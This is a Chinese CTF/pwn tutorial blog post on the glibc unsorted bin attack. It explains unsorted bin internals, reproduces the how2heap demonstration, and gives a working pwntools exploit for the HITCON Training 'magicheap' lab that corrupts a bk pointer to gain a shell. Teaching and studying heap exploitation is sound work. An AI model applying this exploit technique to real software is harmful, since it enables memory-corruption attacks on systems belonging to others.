---
title: Unsorted Bin Attack
date: 2022-03-29 14:46:05
tags:
    - pwn
    - 堆
---

<!--more-->

# 来源

当一个较大的 chunk 被分割成两半后，如果剩下的部分大于 MINSIZE，就会被放到 unsorted bin 中。

1. 释放一个不属于 fast bin 的 chunk，并且该 chunk 不和 top chunk 紧邻时，该 chunk 会被首先放到 unsorted bin 中。关于 top chunk 的解释，请参考下面的介绍。
2. 当进行 malloc_consolidate 时，可能会把合并后的 chunk 放到 unsorted bin 中，如果不是和 top chunk 近邻的话。

# 基本使用情况 

1. Unsorted Bin 在使用的过程中，采用的遍历顺序是 FIFO，**即插入的时候插入到 unsorted bin 的头部，取出的时候从链表尾获取**。
2. 在程序 malloc 时，如果在 fastbin，small bin 中找不到对应大小的 chunk，就会尝试从 Unsorted Bin 中寻找  chunk。如果取出来的 chunk 大小刚好满足，就会直接返回给用户，否则就会把这些 chunk 分别插入到对应的 bin 中。

# Unsorted Bin 的结构 

`Unsorted Bin` 在管理时为循环双向链表，若 `Unsorted Bin` 中有两个 `bin`，那么该链表结构如下

![image-20220329162834973](https://s2.loli.net/2022/03/29/ypkTGaYnVLb2AX5.png)

下面这张图就是上面的结构的复现

![image-20220329163244394](C:\Users\22761\AppData\Roaming\Typora\typora-user-images\image-20220329163244394.png)

我们可以看到，在该链表中必有一个节点的 `fd` 指针会指向 `main_arena` 结构体内部。

## 原理：

`_int_malloc` 有这么一段代码，当将一个 unsorted bin 取出的时候，会将 `bck->fd` 的位置写入本 Unsorted Bin 的位置。

```
          /* remove from unsorted list */
          if (__glibc_unlikely (bck->fd != victim))
            malloc_printerr ("malloc(): corrupted unsorted chunks 3");
          unsorted_chunks (av)->bk = bck;
          bck->fd = unsorted_chunks (av);
```

如果我们控制了 bk 的值，我们就能将 `unsorted_chunks (av)` 写到任意地址。

这里以how2heap 仓库中的 [unsorted_bin_attack.c](https://github.com/shellphish/how2heap/blob/master/unsorted_bin_attack.c) 为例进行介绍

```
#include <stdio.h>
#include <stdlib.h>
#include <assert.h>

int main(){
  fprintf(stderr, "This technique only works with buffers not going into tcache, either because the tcache-option for "
        "glibc was disabled, or because the buffers are bigger than 0x408 bytes. See build_glibc.sh for build "
        "instructions.\n");
  fprintf(stderr, "This file demonstrates unsorted bin attack by write a large unsigned long value into stack\n");
  fprintf(stderr, "In practice, unsorted bin attack is generally prepared for further attacks, such as rewriting the "
       "global variable global_max_fast in libc for further fastbin attack\n\n");

  volatile unsigned long stack_var=0;
  fprintf(stderr, "Let's first look at the target we want to rewrite on stack:\n");
  fprintf(stderr, "%p: %ld\n\n", &stack_var, stack_var);//注意第一次输出stack_var的地址

  unsigned long *p=malloc(0x410);
  fprintf(stderr, "Now, we allocate first normal chunk on the heap at: %p\n",p);
  fprintf(stderr, "And allocate another normal chunk in order to avoid consolidating the top chunk with"
           "the first one during the free()\n\n");
  malloc(500);

  free(p);
  fprintf(stderr, "We free the first chunk now and it will be inserted in the unsorted bin with its bk pointer "
       "point to %p\n",(void*)p[1]);

  //------------VULNERABILITY-----------

  p[1]=(unsigned long)(&stack_var-2);//修改了p的bk，p->bk=&stack_var-0x10
  fprintf(stderr, "Now emulating a vulnerability that can overwrite the victim->bk pointer\n");
  fprintf(stderr, "And we write it with the target address-16 (in 32-bits machine, it should be target address-8):%p\n\n",(void*)p[1]);

  //------------------------------------

  malloc(0x410);
  fprintf(stderr, "Let's malloc again to get the chunk we just free. During this time, the target should have already been "
       "rewritten:\n");
  fprintf(stderr, "%p: %p\n", &stack_var, (void*)stack_var);//注意第二次输出stack_var的地址
  assert(stack_var != 0);
}

```

第一次输出stack_var的地址

![image-20220329161703139](https://s2.loli.net/2022/03/29/ek2RJw5VZEcDiMr.png)

第二次输出stack_var的地址

![image-20220329161536843](https://s2.loli.net/2022/03/29/AjLsNgbCPDZvGJ2.png)

![image-20220329162508770](https://s2.loli.net/2022/03/29/diqNzh8PgKAJQvC.png)

可以使用一个图来描述一下具体发生的流程以及背后的原理。

![image-20220329162157742](https://s2.loli.net/2022/03/29/FIuNPDn7UcvGOkA.png)

**初始状态时**

unsorted bin 的 fd 和 bk 均指向 unsorted bin 本身。

**执行 free(p)**

由于释放的 chunk 大小不属于 fast bin 范围内，所以会首先放入到 unsorted bin 中。

**修改 p[1]**

经过修改之后，原来在 unsorted bin 中的 p 的 bk 指针就会指向 stack addr-16 处伪造的 chunk，即 Stack Value 处于伪造 chunk 的 fd 处。

**申请 400 大小的 chunk**

此时，所申请的 chunk 处于 small bin 所在的范围，其对应的 bin 中暂时没有 chunk，所以会去 unsorted bin 中找，发现 unsorted bin 不空，于是把 unsorted bin 中的最后一个 chunk 拿出来。



这里我们可以看到 unsorted bin attack 确实可以修改任意地址的值，但是所修改成的值却不受我们控制，唯一可以知道的是，这个值比较大。**而且，需要注意的是，**

这看起来似乎并没有什么用处，但是其实还是有点卵用的，比如说

- 我们通过修改循环的次数来使得程序可以执行多次循环。
- 我们可以修改 heap 中的 global_max_fast 来使得更大的 chunk 可以被视为 fast bin，这样我们就可以去执行一些 fast bin attack 了。

## 例题-HITCON Training lab14 magic heap

未开pie

![image-20220329170452592](https://s2.loli.net/2022/03/29/KrS64jopgIFTvuD.png)

主函数

![image-20220329170425632](https://s2.loli.net/2022/03/29/fTLjV6vHnXDSZu7.png)

发现有个判断，只要绕过这个判断就可以拿到shell了，主函数是个菜单，堆题。

### 思路

因为本题用unsorted bin attack，所以我们创造几个堆，释放堆到unsorted bin,然后覆盖其中一个堆，利用堆溢出漏洞修改 unsorted bin 中对应堆块的 bk 指针为 &magic-0x10。，unsorted bin attack刚好能使bk的值变得很大绕过判断拿到shell

### EXP:

```
# -*- coding: utf-8 -*-
from pwn import *
context.log_level='debug'
r = process('./magicheap')


def create_heap(size, content):
    r.recvuntil(":")
    r.sendline("1")
    r.recvuntil(": ")
    r.sendline(str(size))
    r.recvuntil(":")
    r.sendline(content)


def edit_heap(idx, size, content):
    r.recvuntil(":")
    r.sendline("2")
    r.recvuntil(":")
    r.sendline(str(idx))
    r.recvuntil(": ")
    r.sendline(str(size))
    r.recvuntil(": ")
    r.sendline(content)


def del_heap(idx):
    r.recvuntil(":")
    r.sendline("3")
    r.recvuntil(":")
    r.sendline(str(idx))
create_heap(0x20, "dada")  # 0
create_heap(0x80, "dada")  # 1
create_heap(0x20, "dada")  # 2
del_heap(1)
magic_addr=0x006020C0
fd = 0
bk = magic_addr- 0x10
edit_heap(0,0x20+0x20,'a'*0x20+p64(0)+p64(0x91)+p64(fd)+p64(bk))#通过0堆块覆盖1堆块，先用20个‘a’覆盖0堆块，再构造1堆块的内容，使其bk指向magic-0x10
create_heap(0x80,'aaaa')
r.recvuntil(":")
r.sendline("4869")
gdb.attach(r)
r.interactive()
```

